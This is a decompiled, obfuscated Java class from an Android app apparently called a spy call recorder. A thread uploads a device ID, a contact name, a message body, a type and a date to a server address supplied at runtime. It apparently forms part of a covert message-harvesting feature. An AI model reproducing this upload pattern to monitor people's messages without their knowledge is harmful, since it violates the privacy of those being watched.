package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.b.a.a.a;
import a.c.e.e;
import android.content.Context;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SocialNetwork */
public class m extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f250a;

    /* renamed from: b reason: collision with root package name */
    private final String f251b;

    /* renamed from: c reason: collision with root package name */
    private final String f252c;

    /* renamed from: d reason: collision with root package name */
    private final String f253d;

    /* renamed from: e reason: collision with root package name */
    private final String f254e;
    private String f = "";

    public m(Context context, String str, String str2, String str3, String str4, String str5) {
        this.f250a = context;
        this.f252c = str;
        this.f253d = str2;
        this.f254e = str3;
        this.f251b = str4;
        this.f = str5;
    }

    public void run() {
        HashMap hashMap = new HashMap();
        String str = "";
        StringBuilder a2 = a.a(str);
        a2.append(e.e(this.f250a));
        hashMap.put("idPhone", a2.toString());
        StringBuilder sb = new StringBuilder();
        sb.append(str);
        sb.append(this.f252c);
        hashMap.put("fullName", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append(str);
        sb2.append(this.f253d);
        hashMap.put("message", sb2.toString());
        StringBuilder sb3 = new StringBuilder();
        sb3.append(str);
        sb3.append(this.f254e);
        hashMap.put("type", sb3.toString());
        StringBuilder sb4 = new StringBuilder();
        sb4.append(str);
        sb4.append(this.f251b);
        hashMap.put("date", sb4.toString());
        try {
            if (!a.c.e.a.b(this.f, (Map<String, String>) hashMap)) {
                a.a.a(this.f252c, this.f253d, this.f254e, this.f251b, this.f, this.f250a);
            }
        } catch (Exception e2) {
            try {
                a.a.a(this.f252c, this.f253d, this.f254e, this.f251b, this.f, this.f250a);
            } catch (Exception e3) {
                e3.getStackTrace();
            }
            e2.getStackTrace();
        }
    }
}
